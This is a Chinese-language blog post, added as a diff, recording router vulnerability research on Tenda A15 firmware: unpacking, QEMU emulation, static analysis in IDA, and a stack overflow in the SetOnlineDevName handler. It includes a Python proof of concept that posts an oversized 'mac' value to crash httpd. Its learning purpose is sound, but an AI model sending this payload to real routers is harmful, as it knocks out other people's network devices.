@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Keep Team">
+    
+    <title>
+        
+            IOT漏洞挖掘初体验-Tenda A15 |
+        
+        Keep Theme
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Keep Theme","author":"Keep Team","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Keep Theme
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        IOT漏洞挖掘初体验-Tenda A15
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Keep Team</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2026-04-04 20:44:44</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Apr 06 2026 16:56:49 GMT+0800">2026-04-06 16:56:49</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/iot/">iot</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/mips/">mips</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/iot/">iot</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="Tenda-A15-固件模拟与漏洞复现"><a href="#Tenda-A15-固件模拟与漏洞复现" class="headerlink" title="Tenda A15 固件模拟与漏洞复现"></a>Tenda A15 固件模拟与漏洞复现</h2><h3 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;--- 1. 固件解包工具检测 ---&quot;</span><br><span class="line">which sasquatch</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n--- 2. QEMU 模拟环境检测 ---&quot;</span><br><span class="line">qemu-mipsel-static --version</span><br><span class="line">qemu-system-mipsel --version</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n--- 3. 调试工具检测 ---&quot;</span><br><span class="line">gdb-multiarch --version</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n--- 4. 网络与依赖服务检测 ---&quot;</span><br><span class="line">brctl show</span><br><span class="line">systemctl is-active rpcbind</span><br></pre></td></tr></table></figure>
+
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405123942724.png"  alt="image-20260405123942724"></p>
+<h3 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h3><p><a class="link"   target="_blank" rel="noopener" href="https://static.tenda.com.cn/tdeweb/download/A15/US_A15V1.0RTL_V15.13.07.13_multi_TD01.zip" >固件下载地址<i class="fas fa-external-link-alt"></i></a></p>
+<p>提取固件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me US_A15V1.0RTL_V15.13.07.13_multi_TD01.bin</span><br></pre></td></tr></table></figure>
+
+<p>终端会滚动输出很多信息，并且在当前目录下会生成一个以 <code>_固件名.extracted</code> 结尾的新文件夹，里面包含一个 <code>squashfs-root</code> 目录。这就是路由器里的完整 Linux 文件系统了！</p>
+<p>查看程序信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file bin/httpd</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260406165054220.png"  alt="image-20260406165054220"></p>
+<p>将 x86 架构下的 MIPS 翻译器（QEMU）复制到当前假根目录中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp $(which qemu-mipsel-static) .</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用 <code>chroot</code> 将当前目录作为根目录，启动 <code>httpd</code> 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/httpd</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405130000716.png" ></p>
+<p>没反应，ip地址错误，没有布置监听</p>
+<h3 id="文件系统修补"><a href="#文件系统修补" class="headerlink" title="文件系统修补"></a>文件系统修补</h3><p>在真实的 IoT 设备中，根文件系统（也就是提取出来的 <code>squashfs</code>）通常是<strong>只读的（Read-Only）</strong>。</p>
+<p>但是，<code>httpd</code> 服务在运行时，必须生成一些动态数据，比如：</p>
+<ul>
+<li>记录当前进程号的 PID 文件</li>
+<li>用户的 Session 缓存、临时上传的配置文件。</li>
+<li>运行时的网络状态（<code>/var/run</code>）。</li>
+</ul>
+<p><strong>真实路由器的做法</strong>：在系统刚通电开机时，操作系统的启动脚本（<code>init</code>）会在内存中划分出一块区域（<code>tmpfs</code>，也就是内存虚拟盘），然后把 <code>/var</code>、<code>/tmp</code> 等需要频繁读写的目录挂载到这个内存盘上。接着，它会把出厂默认的配置文件（存放在以 <code>_ro</code> 即 Read-Only 结尾的目录里）复制到真正的运行目录中。</p>
+<p><strong>我们的模拟环境</strong>：提取出的 <code>squashfs-root</code> 只是固件在关机状态下的静态文件。它缺少了开机时动态创建的那些目录，而且真正的配置文件还在 <code>etc_ro</code> 里睡大觉，真正的网页文件还在 <code>webroot_ro</code> 里。</p>
+<p>在目录etc_ro中有init.d目录，其中的文件就是启动项,但是不能直接去启动它，因为它包含 <code>mount -t ramfs</code> 等命令会因为权限问题报错并且<code>/sbin</code>、<code>/etc</code> 等绝对路径与实际不符合</p>
+<blockquote>
+<h3 id="更改方法"><a href="#更改方法" class="headerlink" title="更改方法"></a>更改方法</h3><p><strong>照抄 <code>rcS</code> 的 <code>mkdir</code> 动作</strong></p>
+<p><strong>执行 <code>rcS</code> 里的文件拷贝</strong>：把 <code>etc_ro</code> 和 <code>webroot_ro</code> 里的资源部署到位。</p>
+<p><strong>加入 <code>strace</code> 发现的补丁</strong>：加上 <code>/proc</code>、<code>/sys</code>、<code>/dev</code> 的 <code>mount</code> 动作。</p>
+</blockquote>
+<p>下图是etc_ro中有init.d的rcS的内容</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405133225104.png"  alt="image-20260405133225104"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mkdir -p ./var/etc</span><br><span class="line">mkdir -p ./var/media</span><br><span class="line">mkdir -p ./var/webroot</span><br><span class="line">mkdir -p ./var/etc/iproute</span><br><span class="line">mkdir -p ./var/run</span><br><span class="line">mkdir -p ./var/etc/udhcpc</span><br><span class="line">mkdir -p ./var/debug</span><br><span class="line">mkdir -p ./dev/pts</span><br><span class="line">mkdir -p ./var/ppp</span><br><span class="line">mkdir -p ./tmp</span><br><span class="line"></span><br><span class="line">cp -rf ./etc_ro/* ./var/etc/</span><br><span class="line">cp -rf ./webroot_ro/* ./var/webroot</span><br></pre></td></tr></table></figure>
+
+
+
+<p>挂载（Mount）：给程序装上“传感器，<code>proc</code>、<code>sys</code>、<code>dev</code> ，路由器程序（<code>httpd</code>）运行的时候，会去 <code>/proc</code> 里看系统状态。如果不挂载，它看到的文件夹就是空的，它会觉得自己跑在一个“死掉”的系统里，然后直接报错退出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t proc /proc ./proc</span><br><span class="line">sudo mount -t sysfs /sys ./sys</span><br><span class="line">sudo mount --bind /dev ./dev</span><br></pre></td></tr></table></figure>
+
+<p>软链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -snf ./var/webroot ./webroot</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="网卡接口配置"><a href="#网卡接口配置" class="headerlink" title="网卡接口配置"></a>网卡接口配置</h3><p>为了“伪造”出路由器程序赖以生存的硬件环境，并打通与该程序之间的通信链路，让固件正常运行，我们必须在 Linux 内核中伪造出它所需的网络拓扑</p>
+<p>静态分析看到应该是br0和80端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405162432190.png"  alt="image-20260405162432190"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ip addr add 192.168.0.1/24 dev br0</span><br><span class="line">sudo ip link set br0 up</span><br></pre></td></tr></table></figure>
+
+<p>然后再次执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/httpd</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405130608713.png"  alt="image-20260405130608713"></p>
+<h3 id="漏洞静态分析"><a href="#漏洞静态分析" class="headerlink" title="漏洞静态分析"></a>漏洞静态分析</h3><p><code>initWebs</code>是初始话web界面，并根据提交表单调用相应功能</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405173358412.png"  alt="image-20260405173358412"></p>
+<p><strong>API 路由表</strong></p>
+<p>websFormDefine(“前端名字”, 后端C函数名)</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405171125420.png"  alt="image-20260405171125420"></p>
+<p>大佬的说要多关注带有set的功能，因为大多数是需要接受前端数据，进行设置操作的，因此存在较高的安全风险</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201342610.png"  alt="image-20260405201342610"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201404699.png"  alt="image-20260405201404699"></p>
+<p>分析处理<code>SetOnlineDevName</code> 请求的<code>formSetDeviceName</code> 函数，其中的<code>set_device_name</code>发现漏洞</p>
+<p>没有对字符串长度校验，使用<code>sprintf</code>会造成栈溢出漏洞导致程序崩溃</p>
+<p>在常规 Pwn 题里，接收输入的是 <code>read(0, buf, size)</code> 或者 <code>gets(buf)</code>，直接从标准输入流读。</p>
+<p>而在 Tenda 路由器的 <code>formSetDeviceName</code> 函数里，它绝对不会调用 <code>scanf</code> 或 <code>read</code> 等待你输入。<code>websFormHandler</code> 会把 HTTP POST 请求全部接收完毕，并解析成了内存里的一个字典结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import cyclic</span><br><span class="line"></span><br><span class="line">ip = &#x27;192.168.0.1&#x27; # 填网桥 IP</span><br><span class="line">url =  f&#x27;http://&#123;ip&#125;/goform/SetOnlineDevName&#x27;</span><br><span class="line"></span><br><span class="line"># 结合优势：攻击 mac 字段，并使用 4000 字节的超大探针！</span><br><span class="line">payload = &#123;</span><br><span class="line">  &quot;mac&quot;: cyclic(4000), </span><br><span class="line">  &quot;devName&quot;: &quot;devname1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 正在发送 4000 字节的终极探针...&quot;)</span><br><span class="line">try:</span><br><span class="line">    requests.post(url=url , data=payload, timeout=2)</span><br><span class="line">except Exception:</span><br><span class="line">    print(&quot;[+] 目标已彻底断开，绝对当场暴毙！&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405173515491.png"  alt="image-20260405173515491"></p>
+<p>但是运行结果非预期，程序并没有崩溃，还打印了信息<strong>device name setted failed!<strong>和</strong>set device name error!</strong></p>
+<p>在ida中追踪发现是调用<code>tpi_set_mac_info</code>失败</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201730557.png"  alt="image-20260405201730557"></p>
+<p>可以用IDA进行patch，直接把跳转指令nop掉就达到我们的目的了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405202219689.png"  alt="image-20260405202219689"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405202259165.png"  alt="image-20260405202259165"></p>
+<p>之后再运行就可以了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405171551152.png"  alt="image-20260405171551152"></p>
+<h3 id="系统模拟对比"><a href="#系统模拟对比" class="headerlink" title="系统模拟对比"></a>系统模拟对比</h3><p>系统级模拟（System-mode Emulation）相当于在 Kali 里用 VMware 跑了一个完整的虚拟机。</p>
+<table>
+<thead>
+<tr>
+<th><strong>对比维度</strong></th>
+<th><strong>用户态模拟 (qemu-user-static)</strong></th>
+<th><strong>全系统模拟 (qemu-system)</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>模拟层级</strong></td>
+<td>仅模拟 CPU 指令集和系统调用</td>
+<td>模拟整个硬件平台（CPU、总线、外设）</td>
+</tr>
+<tr>
+<td><strong>运行对象</strong></td>
+<td><strong>单个</strong>二进制 ELF 文件（如 <code>httpd</code>）</td>
+<td><strong>完整</strong>的操作系统（Kernel + 文件系统）</td>
+</tr>
+<tr>
+<td><strong>真实度 (Fidelity)</strong></td>
+<td>较低。极易遇到 NVRAM 缺失、IPC 通信失败的问题</td>
+<td>极高。几乎等同于一台真实的物理路由器</td>
+</tr>
+<tr>
+<td><strong>资源消耗与速度</strong></td>
+<td>极低，启动秒开，非常适合快速跑 Fuzzing</td>
+<td>较高，需要完整的开机自检，启动耗时</td>
+</tr>
+<tr>
+<td><strong>网络环境</strong></td>
+<td>默认共享 Kali 的本地网络（127.0.0.1 极其方便）</td>
+<td>需要配置复杂的虚拟网卡（TAP&#x2F;TUN&#x2F;br0）来进行桥接</td>
+</tr>
+<tr>
+<td><strong>应用场景</strong></td>
+<td>快速验证溢出漏洞、逆向分析单一函数的算法</td>
+<td>测算真实偏移量、编写完整 RCE Exploit、研究内核提权</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>维度</strong></th>
+<th><strong>用户态模拟 (User-mode)</strong></th>
+<th><strong>系统级模拟 (System-mode)</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>定位</strong></td>
+<td><strong>微观：</strong> 死磕某个具体的二进制程序（如 <code>httpd</code>）</td>
+<td><strong>宏观：</strong> 运行整个固件系统，看整体效果</td>
+</tr>
+<tr>
+<td><strong>优势</strong></td>
+<td><strong>快、纯净、调试极方便。</strong> 配合 <code>pwndbg</code> 就像在本地调试一样顺滑。</td>
+<td><strong>真实。</strong> 网络、内核、文件系统环境完整，不需要手动补齐依赖。</td>
+</tr>
+<tr>
+<td><strong>痛点</strong></td>
+<td><strong>硬件缺失。</strong> 经常会因为找不到 NVRAM 或特定的硬件驱动而崩溃。</td>
+<td><strong>重、慢、坑多。</strong> 配置网络桥接和内核非常折磨人。</td>
+</tr>
+<tr>
+<td><strong>适用场景</strong></td>
+<td><strong>编写 Exploit (Pwn)：</strong> 构造 ROP 链、计算偏移、调试内存。</td>
+<td><strong>漏洞搜索：</strong> 用 Burp Suite 抓包、分析 Web 逻辑、验证最终利用。</td>
+</tr>
+</tbody></table>
+<p>我们在用户态成功运行的基础上继续执行，在ubuntu中造出一块虚拟网卡和两块虚拟测试板，让它们能和 QEMU 里的 MIPS 虚拟机互相“打通”。</p>
+<p>宿主机配置虚拟网卡</p>
+<p>系统态 QEMU 启动后是一个完全独立的黑盒，我们需要在ubuntu上拉一根“虚拟网线（tap0）”连到虚拟机上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add dev tap0 mode tap# 创建 tap0 虚拟网卡</span><br><span class="line">sudo ip link set tap0 up</span><br><span class="line">sudo ip addr add 10.10.10.1/24 dev tap0# 给ubuntu配置一个 IP (作为虚拟机的网关)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在复现的是 Tenda A15，它的芯片是 <strong>MIPS 小端序 (mipsel)</strong>。所以需要寻找支持 <code>mipsel</code> 架构的内核和镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta# 下载内核</span><br><span class="line"># 下载磁盘镜像</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2</span><br></pre></td></tr></table></figure>
+
+
+
+<p>按下虚拟 MIPS 电脑的电源键</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">    -net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=ttyS0&quot;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>相当于组装电脑时的…</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>mipsel</code></strong></td>
+<td>选一个 MIPS 的 CPU</td>
+</tr>
+<tr>
+<td><strong><code>-M malta</code></strong></td>
+<td>选一块 Malta 牌主板</td>
+</tr>
+<tr>
+<td><strong><code>-kernel</code></strong></td>
+<td>给 CPU 加载指令集（灵魂）</td>
+</tr>
+<tr>
+<td><strong><code>-hda</code></strong></td>
+<td>插上一块装好系统的硬盘</td>
+</tr>
+<tr>
+<td><strong><code>-net tap</code></strong></td>
+<td>插上一根连接 Kali 的网线</td>
+</tr>
+<tr>
+<td><strong><code>console=ttyS0</code></strong></td>
+<td>把显卡线插到串口监视器上</td>
+</tr>
+</tbody></table>
+<p>滚动停止后，会出现：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Debian GNU/Linux 7 debian-mipsel ttyS0` `debian-mipsel login:</span><br></pre></td></tr></table></figure></blockquote>
+<p>这时请输入：</p>
+<ul>
+<li><strong>用户名：</strong> <code>root</code></li>
+<li><strong>密码：</strong> <code>root</code></li>
+</ul>
+<p>配置虚拟机内部网络，把网络打通并伪造网桥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 1. 给虚拟机的 eth0 配置 IP，连接你的 Kali (10.10.10.1)</span><br><span class="line">ip addr add 10.10.10.2/24 dev eth0</span><br><span class="line">ip link set eth0 up</span><br><span class="line"></span><br><span class="line"># 2. 伪造 Tenda 固件找的 br0</span><br><span class="line">ip link add br0 type dummy</span><br><span class="line">ip addr add 10.10.10.3/24 dev br0</span><br><span class="line">ip link set br0 up</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为虚拟机现在是空的，我们需要从的宿主机把 <code>squashfs-root</code> 传过去。</p>
+<p><strong>在宿主机</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 进入上一级目录，把 squashfs-root 打包</span><br><span class="line">cd ~/De/pwn_work/_US_A15V1.0RTL_V15.13.07.13_multi_TD01.bin.extracted/</span><br><span class="line"># 排除掉那个巨大的镜像文件，只打包固件</span><br><span class="line">tar -zcvf rootfs.tar.gz --exclude=&#x27;*.qcow2&#x27; squashfs-root/</span><br><span class="line">python3 -m http.server 8000#把当前目录变成一个微型网站。</span><br><span class="line">#效果： 运行后，任何人只要访问的 IP (10.10.10.1) 和 8000 端口，就能看到并下载这个目录下的文件。</span><br></pre></td></tr></table></figure>
+
+<p><strong>在虚拟机终端：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.10.1:8000/rootfs.tar.gz</span><br><span class="line">tar -zxvf rootfs.tar.gz</span><br><span class="line">cd squashfs-root/</span><br></pre></td></tr></table></figure>
+
+
+
+<p>虚拟机：挂载并启动</p>
+<p>在虚拟机终端继续执行：</p>
